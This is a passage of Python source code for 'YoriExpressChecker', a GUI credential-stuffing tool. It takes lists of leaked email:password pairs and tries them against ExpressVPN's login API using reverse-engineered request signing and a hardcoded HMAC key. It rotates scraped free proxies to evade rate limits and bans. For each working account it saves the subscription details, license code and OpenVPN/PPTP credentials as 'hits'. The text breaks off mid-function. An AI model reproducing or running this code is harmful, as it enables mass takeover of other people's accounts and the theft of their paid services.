import os
import re
import json
import time
import gzip
import hmac
import hashlib
import base64
import random
import string
import requests
import threading
import queue
from datetime import datetime
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor
import urllib3

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.serialization import load_der_public_key
from cryptography.hazmat.primitives.padding import PKCS7
from asn1crypto import cms, core, x509

urllib3.disable_warnings()

# Tkinter imports - only available when running GUI locally
try:
    import tkinter as tk
    from tkinter import filedialog, messagebox, scrolledtext
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

APP_NAME = "YoriExpressChecker"
CREDIT = "made with love by @WhoEvenYori"
TELEGRAM_LINK = "https://t.me/yorifederation"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}

THROTTLE_CODES = {429, 500, 502, 503, 504}

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
]

# =====================================================================
# EXPRESSVPN CONSTANTS — HEART KEPT INTACT
# =====================================================================
CERT_B64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"


def now_ts():
    return datetime.now().strftime("%H:%M:%S")


def safe_filename(value):
    return re.sub(r"[^A-Za-z0-9_-]", "_", str(value))[:80]


# =====================================================================
# CRYPTO HELPERS — HEART KEPT INTACT
# =====================================================================
def compute_signature(data: bytes) -> str:
    digest = hmac.new(HMAC_KEY.encode("ascii"), data, hashlib.sha1).digest()
    return base64.b64encode(digest).decode("ascii")


def gzip_data(input_str: str) -> bytes:
    stream = BytesIO()
    with gzip.GzipFile(fileobj=stream, mode="wb") as gz:
        gz.write(input_str.encode("utf-8"))
    return stream.getvalue()


def aes_cbc_decrypt(data: bytes, key_b64: str, iv_b64: str) -> bytes:
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(data) + decryptor.finalize()

    try:
        unpadder = PKCS7(128).unpadder()
        return unpadder.update(padded) + unpadder.finalize()
    except Exception:
        if padded:
            pad = padded[-1]
            if 0 < pad <= 16:
                return padded[:-pad]
        return padded


def envelope_encrypt(data: bytes) -> bytes:
    cert_der = base64.b64decode(CERT_B64)
    cert = x509.Certificate.load(cert_der)

    aes_key = os.urandom(16)
    iv = os.urandom(16)

    padder = PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    encrypted_content = encryptor.update(padded) + encryptor.finalize()

    public_key = load_der_public_key(cert.public_key.dump())
    encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())

    recipient_info = cms.RecipientInfo({
        "ktri": cms.KeyTransRecipientInfo({
            "version": cms.CMSVersion(0),
            "rid": cms.RecipientIdentifier({
                "issuer_and_serial_number": cms.IssuerAndSerialNumber({
                    "issuer": cert["tbs_certificate"]["issuer"],
                    "serial_number": cert["tbs_certificate"]["serial_number"]
                })
            }),
            "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({
                "algorithm": "1.2.840.113549.1.1.1",
                "parameters": core.Null()
            }),
            "encrypted_key": encrypted_key
        })
    })

    enveloped_data = cms.EnvelopedData({
        "version": cms.CMSVersion(0),
        "recipient_infos": cms.RecipientInfos([recipient_info]),
        "encrypted_content_info": cms.EncryptedContentInfo({
            "content_type": "1.2.840.113549.1.7.1",
            "content_encryption_algorithm": cms.EncryptionAlgorithm({
                "algorithm": "2.16.840.1.101.3.4.1.2",
                "parameters": core.OctetString(iv)
            }),
            "encrypted_content": core.OctetString(encrypted_content)
        })
    })

    content_info = cms.ContentInfo({
        "content_type": "1.2.840.113549.1.7.3",
        "content": enveloped_data
    })

    return content_info.dump()


def generate_install_id() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=64))


# =====================================================================
# EXPRESSVPN CHECK CORE — HEART KEPT INTACT
# =====================================================================
def check_expressvpn(email: str, password: str, proxy: str):
    result = {
        "email": email,
        "password": password,
        "status": "ERROR",
        "data": {},
        "error": "Unknown",
        "multiline": ""
    }

    session = requests.Session()
    if proxy:
        proxy_url = f"http://{proxy}"
        session.proxies.update({"http": proxy_url, "https": proxy_url})

    session.headers.update({
        "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2"
    })

    try:
        iv = os.urandom(16)
        key = os.urandom(16)
        base64_iv = base64.b64encode(iv).decode("ascii")
        base64_key = base64.b64encode(key).decode("ascii")
        install_id = generate_install_id()

        post_data_dict = {
            "email": email,
            "iv": base64_iv,
            "key": base64_key,
            "password": password
        }
        post_data = json.dumps(post_data_dict, separators=(",", ":"))
        gzipped = gzip_data(post_data)
        encrypted_post = envelope_encrypt(gzipped)

        header_raw = (
            f"POST /apis/v2/credentials?client_version=11.5.2"
            f"&installation_id={install_id}&os_name=ios&os_version=14.4"
        )
        header_signature = compute_signature(header_raw.encode("ascii"))
        post_signature = compute_signature(encrypted_post)

        url = (
            "https://www.expressapisv2.net/apis/v2/credentials"
            f"?client_version=11.5.2&installation_id={install_id}"
            "&os_name=ios&os_version=14.4"
        )

        headers = {
            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
            "Expect": "",
            "Content-Type": "application/octet-stream",
            "X-Body-Compression": "gzip",
            "X-Signature": f"2 {header_signature} 91c776e",
            "X-Body-Signature": f"2 {post_signature} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate"
        }

        response = session.post(
            url,
            data=encrypted_post,
            headers=headers,
            timeout=15,
            verify=False
        )

    except (
        requests.exceptions.ProxyError,
        requests.exceptions.ConnectTimeout,
        requests.exceptions.ReadTimeout,
        requests.exceptions.ConnectionError,
        requests.exceptions.ChunkedEncodingError
    ):
        result["status"] = "PROXY"
        result["error"] = "Network/proxy failure on credentials endpoint"
        return result
    except Exception as exc:
        result["status"] = "ERROR"
        result["error"] = str(exc)[:120]
        return result

    if response.status_code in (400, 401):
        result["status"] = "INVALID"
        result["error"] = "Invalid credentials"
        return result

    if response.status_code == 500:
        result["status"] = "BAN"
        result["error"] = "Server returned 500/BAN behavior"
        return result

    if response.status_code in THROTTLE_CODES or response.status_code in (403, 408):
        result["status"] = "PROXY"
        result["error"] = f"HTTP {response.status_code} on credentials endpoint"
        return result

    if response.status_code != 200:
        result["status"] = "ERROR"
        result["error"] = f"HTTP {response.status_code} on credentials endpoint"
        return result

    try:
        decrypted = aes_cbc_decrypt(response.content, base64_key, base64_iv)
        response_body = decrypted.decode("utf-8", errors="ignore")
    except Exception:
        result["status"] = "PROXY"
        result["error"] = "Decryption failed, rotating proxy"
        return result

    try:
        access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
        ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
        ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
        pptp_user = re.search(r'"pptp_username":"([^"]+)"', response_body).group(1)
        pptp_pass = re.search(r'"pptp_password":"([^"]+)"', response_body).group(1)
    except Exception:
        result["status"] = "ERROR"
        result["error"] = "Failed to parse credentials response"
        return result

    try:
        sub_raw = (
            f"GET /apis/v2/subscription?access_token={access_token}"
            f"&client_version=11.5.2&installation_id={install_id}"
            "&os_name=ios&os_version=14.4&reason=activation_with_email"
        )
        sub_signature = compute_signature(sub_raw.encode("ascii"))

        batch_raw = (
            "POST /apis/v2/batch?client_version=11.5.2"
            f"&installation_id={install_id}&os_name=ios&os_version=14.4"
        )
        batch_signature = compute_signature(batch_raw.encode("ascii"))

        capture_object = [
            {
                "headers": {
                    "Accept-Language": "en",
                    "X-Signature": f"2 {sub_signature} 91c776e"
                },
                "method": "GET",
                "url": (
                    f"/apis/v2/subscription?access_token={access_token}"
                    f"&client_version=11.5.2&installation_id={install_id}"
                    "&os_name=ios&os_version=14.4&reason=activation_with_email"
                )
            }
        ]

        capture_body = json.dumps(capture_object, separators=(",", ":"))
        capture_signature = compute_signature(capture_body.encode("ascii"))

        batch_url = (
            "https://www.expressapisv2.net/apis/v2/batch"
            f"?client_version=11.5.2&installation_id={install_id}"
            "&os_name=ios&os_version=14.4"
        )

        batch_headers = {
            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
            "X-Body-Compression": "gzip",
            "X-Signature": f"2 {batch_signature} 91c776e",
            "X-Body-Signature": f"2 {capture_signature} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate"
        }

        batch_response = session.post(
            batch_url,
            data=capture_body,
            headers=batch_headers,
            timeout=15,
            verify=False
        )

    except (
        requests.exceptions.ProxyError,
        requests.exceptions.ConnectTimeout,
        requests.exceptions.ReadTimeout,
        requests.exceptions.ConnectionError,
        requests.exceptions.ChunkedEncodingError
    ):
        result["status"] = "PROXY"
        result["error"] = "Network/proxy failure on batch endpoint"
        return result
    except Exception as exc:
        result["status"] = "ERROR"
        result["error"] = str(exc)[:120]
        return result

    if batch_response.status_code in THROTTLE_CODES:
        result["status"] = "PROXY"
        result["error"] = f"HTTP {batch_response.status_code} on batch endpoint"
        return result

    if batch_response.status_code != 200:
        result["status"] = "ERROR"
        result["error"] = f"HTTP {batch_response.status_code} on batch endpoint"
        return result

    text = batch_response.text

    if "subscription" not in text or "REVOKED" in text or 'status\\\":\\\"\\\"' in text:
        result["status"] = "EXPIRED"
        result["error"] = "No active subscription"
        return result

    try:
        unescaped = text.encode("utf-8", errors="ignore").decode("unicode_escape", errors="ignore")

        plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
        plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"

        auto_renew_match = re.search(r'auto_bill":([^,}]+)', unescaped)
        auto_renew_raw = auto_renew_match.group(1).strip().lower() if auto_renew_match else "false"
        auto_renew = auto_renew_raw == "true"

        exp_match = re.search(r'expiration_time":(\d+)', unescaped)
        expiration = int(exp_match.group(1)) if exp_match else 0
        current_time = int(time.time())

        days_left = round((expiration - current_time) / 86400) if expiration > current_time else 0
        expire_date = datetime.fromtimestamp(expiration).strftime("%Y-%m-%d") if expiration else "N/A"

        payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
        payment = payment_match.group(1) if payment_match else "Unknown"

    except Exception as exc:
        result["status"] = "ERROR"
        result["error"] = f"Subscription parse failed: {str(exc)[:80]}"
        return result

    license_code = "N/A"
    try:
        web_headers = {
            "Host": "www.expressvpn.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://portal.expressvpn.com/my-subscriptions",
            "authorization": f"Bearer {access_token}",
            "content-type": "application/json",
            "x-tenant": "xvpn",
            "Origin": "https://portal.expressvpn.com",
            "Connection": "keep-alive"
        }
        web_resp = session.get(
            "https://www.expressvpn.com/api/v2/subscriptions",
            headers=web_headers,
            timeout=15,
            verify=False
        )
        licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
        if licenses:
            license_code = licenses[-1]
    except Exception:
        pass

    result["status"] = "HIT"
    result["error"] = ""
    result["data"] = {
        "plan": plan,
        "auto_renew": auto_renew,
        "expire_date": expire_date,
        "days_left": days_left,
        "payment_method": payment,
        "license": license_code,
        "ovpn_user": ovpn_user,
        "ovpn_pass": ovpn_pass,
        "pptp_user": pptp_user,
        "pptp_pass": pptp_pass
    }
    result["multiline"] = build_report(email, password, result["data"])
    return result


def build_report(email, password, data):
    lines = []
    lines.append("=" * 80)
    lines.append(f"{email}:{password}")
    lines.append("=" * 80)
    lines.append("EXPRESSVPN ACCOUNT DETAILS")
    lines.append("|-- ACCOUNT INFO")
    lines.append(f"|   |-- Login          : {email}:{password}")
    lines.append(f"|   |-- Status         : PREMIUM")
    lines.append("|")
    lines.append("|-- SUBSCRIPTION")
    lines.append(f"|   |-- Plan           : {data.get('plan', 'Unknown')}")
    lines.append(f"|   |-- Auto Renew     : {'YES' if data.get('auto_renew') else 'NO'}")
    lines.append(f"|   |-- Expire Date    : {data.get('expire_date', 'N/A')}")
    lines.append(f"|   |-- Days Left      : {data.get('days_left', 0)}")
    lines.append(f"|   |-- Payment Method : {data.get('payment_method', 'Unknown')}")
    lines.append(f"|   |-- License Code   : {data.get('license', 'N/A')}")
    lines.append("|")
    lines.append("|-- PROTOCOL CREDENTIALS")
    lines.append(f"|   |-- OpenVPN Username : {data.get('ovpn_user', 'N/A')}")
    lines.append(f"|   |-- OpenVPN Password : {data.get('ovpn_pass', 'N/A')}")
    lines.append(f"|   |-- PPTP Username    : {data.get('pptp_user', 'N/A')}")
    lines.append(f"|   |-- PPTP Password    : {data.get('pptp_pass', 'N/A')}")
    lines.append("|")
    lines.append(f"{APP_NAME} | {CREDIT}")
    lines.append(f"Channel: {TELEGRAM_LINK}")
    return "\n".join(lines)


def check_account(email, password, proxy_manager, ui_queue, stop_event, max_network_retries=35):
    attempt = 0
    last_result = {
        "email": email,
        "password": password,
        "status": "ERROR",
        "data": {},
        "error": "Max proxy retries reached",
        "multiline": ""
    }

    while not stop_event.is_set() and attempt < max_network_retries:
        proxy = proxy_manager.get()
        if not proxy:
            time.sleep(2)
            continue

        result = check_expressvpn(email, password, proxy)
        status = result.get("status", "ERROR")
        last_result = result

        if status == "PROXY":
            proxy_manager.mark_bad(proxy)
            attempt += 1
            if attempt % 5 == 1:
                ui_queue.put((
                    "log",
                    "PROXY",
                    f"[{now_ts()}] Rotating proxy for {email} | attempt {attempt}"
                ))
            time.sleep(0.25)
            continue

        return status, result

    if stop_event.is_set():
        return "STOP", None

    return "ERROR", last_result


# =====================================================================
# PROXY ENGINE - ADVANCED SERVICE-SPECIFIC POOL SYSTEM
# =====================================================================
class ProxyManager:
    def __init__(self, ui_queue, service="expressvpn"):
        self.pool = []
        self.lock = threading.Lock()
        self.ui_queue = ui_queue
        self.stop_event = threading.Event()
        self.thread = None
        self.scrape_lock = threading.Lock()
        self.service = service
        self.initial_massive_load = True
        self.min_pool_size = 15
        self.max_pool_size = 500
        self.validation_url = self._get_service_validation_url()
        self.validation_pattern = self._get_service_validation_pattern()
        self.checked_proxies = set()
        self.bad_proxies = set()
        self.ready_event = threading.Event()
        
    def _get_service_validation_url(self):
        """Get service-specific validation URL"""
        service_urls = {
            "expressvpn": "https://www.expressvpn.com",
            "crunchyroll": "https://www.crunchyroll.com",
            "steam": "https://steamcommunity.com",
            "default": "https://www.google.com"
        }
        return service_urls.get(self.service.lower(), service_urls["default"])
    
    def _get_service_validation_pattern(self):
        """Get service-specific validation response patterns"""
        patterns = {
            "expressvpn": [200, 301, 302, 303, 307, 308, 403],
            "crunchyroll": [200, 301, 302, 403],
            "steam": [200, 301, 302, 403],
            "default": [200, 301, 302]
        }
        return patterns.get(self.service.lower(), patterns["default"])
    
    def set_service(self, service):
        """Change service for proxy validation"""
        self.service = service
        self.validation_url = self._get_service_validation_url()
        self.validation_pattern = self._get_service_validation_pattern()
        self.log(f"Service changed to {service}. Validation URL: {self.validation_url}")
        self.clear_pool()
        
    def clear_pool(self):
        """Clear current proxy pool"""
        with self.lock:
            self.pool.clear()
            self.checked_proxies.clear()
            self.bad_proxies.clear()
        self.log("Proxy pool cleared")

    def log(self, message, tag="PROXY"):
        self.ui_queue.put(("log", tag, f"[{now_ts()}] {message}"))

    def start(self):
        self.stop_event.clear()
        self.initial_massive_load = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self):
        self.stop_event.set()

    def count(self):
        with self.lock:
            return len(self.pool)

    def get(self):
        with self.lock:
            if not self.pool:
                return None
            return random.choice(self.pool)

    def mark_bad(self, proxy):
        if not proxy:
            return
        with self.lock:
            if proxy in self.pool:
                self.pool.remove(proxy)
            self.bad_proxies.add(proxy)
            if proxy in self.checked_proxies:
                self.checked_proxies.discard(proxy)

    def _run(self):
        self.log(f"Proxy engine started for {self.service.upper()}")
        self.refresh(massive=self.initial_massive_load)
        
        while not self.stop_event.is_set():
            current_count = self.count()
            
            if current_count >= self.min_pool_size and not self.ready_event.is_set():
                self.log(f"Minimum pool size reached ({current_count}). Ready to check!")
                self.ready_event.set()
            elif current_count < self.min_pool_size:
                self.ready_event.clear()
                
            if current_count < self.min_pool_size:
                self.log(f"Pool low ({current_count}). Refetching proxies...")
                self.refresh(massive=False)
            elif current_count < self.max_pool_size * 0.7 and random.random() < 0.4:
                self.refresh(massive=False)
                
            time.sleep(12)
        
        self.log("Proxy engine stopped")

    def refresh(self, massive=False):
        if not self.scrape_lock.acquire(blocking=False):
            return
        try:
            raw = self._scrape_raw()
            if not raw:
                self.log("No raw proxies scraped")
                return
                
            validate_count = 600 if massive else 200
            self.log(f"Scraped {len(raw)} raw proxies. Validating {validate_count} against {self.service.upper()}...")
            
            valid = self._validate(list(raw)[:validate_count])
            
            with self.lock:
                existing = set(self.pool)
                added = 0
                for proxy in valid:
                    if proxy not in existing and proxy not in self.bad_proxies:
                        self.pool.append(proxy)
                        self.checked_proxies.add(proxy)
                        added += 1
                        
            self.log(f"Added {added} valid {self.service.upper()} proxies. Pool size: {self.count()}")
        finally:
            self.scrape_lock.release()

    def _scrape_raw(self):
        raw = set()
        ip_port = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$")
        
        sources_to_use = PROXY_SOURCES
        self.log(f"Fetching from {len(sources_to_use)} proxy sources...")
        
        for source in sources_to_use:
            try:
                response = requests.get(source, timeout=12, headers=HEADERS, verify=False)
                if response.status_code != 200:
                    continue
                for line in response.text.splitlines():
                    line = line.strip()
                    if ip_port.match(line):
                        raw.add(line)
            except Exception:
                continue
        return raw

    def _validate(self, proxies):
        valid = []
        valid_lock = threading.Lock()

        def test_proxy(proxy):
            proxy_url = f"http://{proxy}"
            try:
                response = requests.get(
                    self.validation_url,
                    proxies={"http": proxy_url, "https": proxy_url},
                    timeout=4,
                    headers=HEADERS,
                    verify=False
                )
                if response.status_code in self.validation_pattern:
                    with valid_lock:
                        valid.append(proxy)
            except Exception:
                pass

        worker_count = 300
        with ThreadPoolExecutor(max_workers=worker_count) as executor:
            executor.map(test_proxy, proxies)

        return valid


# =====================================================================
# GUI — SAME YORI FORMAT
# =====================================================================
class YoriExpressCheckerApp:
    BG = "#11111b"
    PANEL = "#181825"
    ENTRY = "#313244"
    FG = "#cdd6f4"
    GREEN = "#a6e3a1"
    RED = "#f38ba8"
    YELLOW = "#f9e2af"
    CYAN = "#89dceb"
    BLUE = "#89b4fa"
    GRAY = "#a6adc8"
    MAGENTA = "#cba6f7"

    def __init__(self, root):
        self.root = root
        self.root.title(APP_NAME)
        self.root.geometry("1100x800")
        self.root.configure(bg=self.BG)

        self.ui_queue = queue.Queue()
        self.proxy_manager = ProxyManager(self.ui_queue, service="expressvpn")
        self.combo_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.counter_lock = threading.Lock()

        self.running = False
        self.finished_flag = False
        self.remaining = 0
        self.paths = None

        self.stats = {
            "TOTAL": 0,
            "CHECKED": 0,
            "HIT": 0,
            "BAD": 0,
            "ERR": 0
        }
        self.stat_labels = {}

        self.clean_pattern = re.compile(
            r"([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}):([^\s|]+)"
        )
        self.loaded_combos = 0

        self._build_ui()
        self.root.after(100, self._process_queue)

    def _build_ui(self):
        top = tk.Frame(self.root, bg=self.BG)
        top.pack(fill="x", padx=12, pady=(12, 6))

        tk.Label(
            top,
            text=APP_NAME,
            bg=self.BG,
            fg=self.BLUE,
            font=("Consolas", 18, "bold")
        ).pack(side="left")

        tk.Label(
            top,
            text=CREDIT,
            bg=self.BG,
            fg=self.GRAY,
            font=("Consolas", 10, "bold")
        ).pack(side="right")

        link_label = tk.Label(
            top,
            text=TELEGRAM_LINK,
            bg=self.BG,
            fg=self.CYAN,
            font=("Consolas", 10, "underline"),
            cursor="hand2"
        )
        link_label.bind("<Button-1>", lambda event: webbrowser.open(TELEGRAM_LINK))
        link_label.pack(side="right", padx=10)

        controls = tk.Frame(self.root, bg=self.PANEL, padx=10, pady=10)
        controls.pack(fill="x", padx=12, pady=6)

        tk.Label(
            controls,
            text="Combo File",
            bg=self.PANEL,
            fg=self.FG,
            font=("Consolas", 10, "bold")
        ).grid(row=0, column=0, sticky="w")

        self.combo_path_var = tk.StringVar()
        combo_entry = tk.Entry(
            controls,
            textvariable=self.combo_path_var,
            bg=self.ENTRY,
            fg=self.FG,
            insertbackground=self.FG,
            relief="flat",
            width=75
        )
        combo_entry.grid(row=0, column=1, padx=8, pady=3)

        tk.Button(
            controls,
            text="Browse",
            command=self._browse_combo,
            bg=self.ENTRY,
            fg=self.FG,
            activebackground=self.BLUE,
            activeforeground=self.BG,
            relief="flat",
            padx=10
        ).grid(row=0, column=2, pady=3)

        self.file_status_var = tk.StringVar(value="No file loaded")
        tk.Label(
            controls,
            textvariable=self.file_status_var,
            bg=self.PANEL,
            fg=self.CYAN,
            font=("Consolas", 9)
        ).grid(row=1, column=0, columnspan=3, sticky="w", pady=(2, 0))

        thread_frame = tk.Frame(controls, bg=self.PANEL)
        thread_frame.grid(row=2, column=0, columnspan=3, sticky="w", pady=(10, 0))

        tk.Label(
            thread_frame,
            text="Threads",
            bg=self.PANEL,
            fg=self.FG,
            font=("Consolas", 10, "bold")
        ).pack(side="left", padx=(0, 8))

        self.thread_var = tk.StringVar(value="10")
        thread_spin = tk.Spinbox(
            thread_frame,
            from_=1,
            to=100,
            textvariable=self.thread_var,
            width=6,
            bg=self.ENTRY,
            fg=self.FG,
            buttonbackground=self.ENTRY,
            relief="flat"
        )
        thread_spin.pack(side="left", padx=(0, 20))

        self.start_button = tk.Button(
            thread_frame,
            text="START",
            command=self.start,
            bg=self.GREEN,
            fg=self.BG,
            activebackground=self.CYAN,
            activeforeground=self.BG,
            relief="flat",
            font=("Consolas", 10, "bold"),
            padx=18
        )
        self.start_button.pack(side="left", padx=6)

        self.stop_button = tk.Button(
            thread_frame,
            text="STOP",
            command=self.stop,
            bg=self.RED,
            fg=self.BG,
            activebackground=self.YELLOW,
            activeforeground=self.BG,
            relief="flat",
            font=("Consolas", 10, "bold"),
            padx=18,
            state="disabled"
        )
        self.stop_button.pack(side="left", padx=6)

        self.results_button = tk.Button(
            thread_frame,
            text="RESULTS",
            command=self.open_results,
            bg=self.ENTRY,
            fg=self.FG,
            activebackground=self.CYAN,
            activeforeground=self.BG,
            relief="flat",
            font=("Consolas", 10, "bold"),
            padx=18
        )
        self.results_button.pack(side="left", padx=6)

        stats_bar = tk.Frame(self.root, bg=self.PANEL, padx=10, pady=8)
        stats_bar.pack(fill="x", padx=12, pady=6)

        for index, key in enumerate(["TOTAL", "CHECKED", "HIT", "BAD", "ERR"]):
            color = self.FG
            if key == "HIT":
                color = self.GREEN
            elif key == "BAD":
                color = self.RED
            elif key == "ERR":
                color = self.MAGENTA

            label = tk.Label(
                stats_bar,
                text=f"{key}: 0",
                bg=self.PANEL,
                fg=color,
                font=("Consolas", 11, "bold")
            )
            label.grid(row=0, column=index, padx=18, sticky="w")
            self.stat_labels[key] = label

        self.proxy_label = tk.Label(
            stats_bar,
            text="Proxy Pool: 0",
            bg=self.PANEL,
            fg=self.CYAN,
            font=("Consolas", 11, "bold")
        )
        self.proxy_label.grid(row=0, column=5, padx=18, sticky="e")

        self.run_label = tk.Label(
            self.root,
            text="Results folder: not started",
            bg=self.BG,
            fg=self.GRAY,
            font=("Consolas", 9),
            anchor="w"
        )
        self.run_label.pack(fill="x", padx=14)

        terminal_frame = tk.Frame(self.root, bg=self.PANEL, padx=8, pady=8)
        terminal_frame.pack(fill="both", expand=True, padx=12, pady=(6, 12))

        self.terminal = scrolledtext.ScrolledText(
            terminal_frame,
            bg="#0b0b12",
            fg=self.FG,
            insertbackground=self.FG,
            font=("Consolas", 9),
            relief="flat",
            wrap="word"
        )
        self.terminal.pack(fill="both", expand=True)
        self.terminal.configure(state="disabled")

        self.terminal.tag_config("SYSTEM", foreground=self.BLUE)
        self.terminal.tag_config("PROXY", foreground=self.CYAN)
        self.terminal.tag_config("HIT", foreground=self.GREEN)
        self.terminal.tag_config("BAD", foreground=self.RED)
        self.terminal.tag_config("EXP", foreground=self.YELLOW)
        self.terminal.tag_config("ERROR", foreground=self.MAGENTA)
        self.terminal.tag_config("WARN", foreground=self.YELLOW)

    def _browse_combo(self):
        path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if path:
            self.combo_path_var.set(path)
            self._auto_format_and_count(path)

    def _auto_format_and_count(self, path):
        self.file_status_var.set("Formatting and counting combos...")
        self.root.update_idletasks()
        count = 0
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as handle:
                for line in handle:
                    match = self.clean_pattern.search(line.strip())
                    if match:
                        count += 1
            self.loaded_combos = count
            self.file_status_var.set(f"Loaded {count:,} valid email:pass combos ready to check.")
        except Exception:
            self.file_status_var.set("Error reading file.")

    def _make_run_paths(self):
        base = os.path.join(os.getcwd(), APP_NAME)
        results_root = os.path.join(base, "results")
        run_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        run_dir = os.path.join(results_root, run_name)

        hits_dir = os.path.join(run_dir, "hits")
        bad_dir = os.path.join(run_dir, "bad")
        error_dir = os.path.join(run_dir, "error")

        os.makedirs(hits_dir, exist_ok=True)
        os.makedirs(bad_dir, exist_ok=True)
        os.makedirs(error_dir, exist_ok=True)

        return {
            "run": run_dir,
            "hits_dir": hits_dir,
            "hits_all": os.path.join(hits_dir, "all_hits.txt"),
            "hits_combo": os.path.join(hits_dir, "hit_combos.txt"),
            "bad_dir": bad_dir,
            "bad_all": os.path.join(bad_dir, "bad.txt"),
            "error": os.path.join(error_dir, "error.txt"),
            "log": os.path.join(run_dir, "run_log.txt")
        }

    def _write_log_file(self, tag, message):
        if not self.paths:
            return
        try:
            with open(self.paths["log"], "a", encoding="utf-8") as handle:
                handle.write(f"[{tag}] {message}\n")
        except Exception:
            pass

    def _terminal_write(self, tag, message):
        self.terminal.configure(state="normal")
        self.terminal.insert(tk.END, message + "\n", tag)
        self.terminal.see(tk.END)
        self.terminal.configure(state="disabled")
        self._write_log_file(tag, message)

    def _update_stats(self):
        for key, value in self.stats.items():
            if key in self.stat_labels:
                self.stat_labels[key].config(text=f"{key}: {value}")

    def _save_result(self, status, combo, result):
        if not self.paths:
            return

        try:
            if status == "HIT":
